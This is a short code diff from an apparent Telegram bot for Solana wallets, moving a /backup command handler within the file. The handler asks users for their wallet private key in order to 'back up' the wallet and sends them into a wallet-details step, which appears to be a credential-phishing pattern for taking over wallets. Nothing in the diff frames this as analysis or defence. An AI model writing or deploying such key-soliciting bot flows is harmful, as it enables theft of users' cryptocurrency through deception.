@@ -103,6 +103,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             disable_web_page_preview=True
         )
 
+async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /backup command."""
+    await update.message.reply_text(
+        "🔐 Backup Your Wallet\n\n"
+        "Please provide your private key to back up your wallet. Make sure to keep it secure and do not share it with anyone else.",
+        parse_mode="Markdown"
+    )
+    return ASK_WALLET_DETAILS
+
 async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Ask the user for their Solana wallet details."""
     await update.callback_query.answer()
@@ -361,15 +370,6 @@ async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
-
-async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the /backup command."""
-    await update.message.reply_text(
-        "🔐 Backup Your Wallet\n\n"
-        "Please provide your private key to back up your wallet. Make sure to keep it secure and do not share it with anyone else.",
-        parse_mode="Markdown"
-    )
-    return ASK_WALLET_DETAILS
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /help command."""
